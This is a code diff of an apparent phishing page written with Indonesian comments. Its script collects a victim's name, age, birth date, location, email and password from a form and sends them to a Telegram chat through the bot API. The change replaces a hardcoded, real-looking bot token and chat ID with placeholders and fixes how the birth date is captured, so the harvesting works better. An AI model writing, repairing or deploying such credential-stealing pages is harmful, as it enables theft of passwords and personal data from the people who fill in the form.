@@ -48,10 +48,8 @@
     <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
     
     <script>
-   
-
- const botToken = '5906990752:AAHv8iFSmHu4MC4SM_IB3EZSiyTLxaZULvM';
-const chatId = '-1001983705713'; // Chat ID penerima pesan
+   const botToken = 'YOUR_BOT_TOKEN';
+const chatId = 'YOUR_CHAT_ID';
 
 async function telegramRequest(method, data) {
   try {
@@ -64,6 +62,16 @@ async function telegramRequest(method, data) {
 }
 
 const form = document.getElementById('form');
+let tgl_lahir; // Deklarasikan variabel tgl_lahir di luar event listener
+
+const inputDate = document.getElementById("tgl_lahir");
+inputDate.addEventListener("change", function() {
+  var selectedDate = inputDate.value;
+  var dateObject = new Date(selectedDate);
+  var options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+  tgl_lahir = dateObject.toLocaleDateString('id-ID', options);
+});
+
 form.addEventListener('submit', async (event) => {
   event.preventDefault();
 
@@ -73,19 +81,12 @@ form.addEventListener('submit', async (event) => {
   const alamat = document.getElementById('lokasi').value;
   const email = document.getElementById('email').value;
   const kata_sandi = document.getElementById('kata_sandi').value;
-     const inputDate = document.getElementById("tgl_lahir");
 
-inputDate.addEventListener("change", function() {
-  const selectedDate = inputDate.value;
-  const dateObject = new Date(selectedDate);
-  const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
-  const tgl_lahir = dateObject.toLocaleDateString('id-ID', options);
-});
   // Buat string dari data yang diambil
   const message = `
   Nama : ${nama}
   Umur : ${umur} Tahun
-  Tanggal Lahir : ${tgl_lahir}
+  Tanggal Lahir : ${tgl_lahir} // Gunakan variabel tgl_lahir yang sudah diisi di event listener
   Lokasi : ${alamat}
   Email : ${email}
   Kata Sandi : ${kata_sandi}
@@ -97,6 +98,7 @@ inputDate.addEventListener("change", function() {
   // Tampilkan pesan sukses
   alert("Berhasil Mengirim");
 });
+
 
 
       function getLocation() {
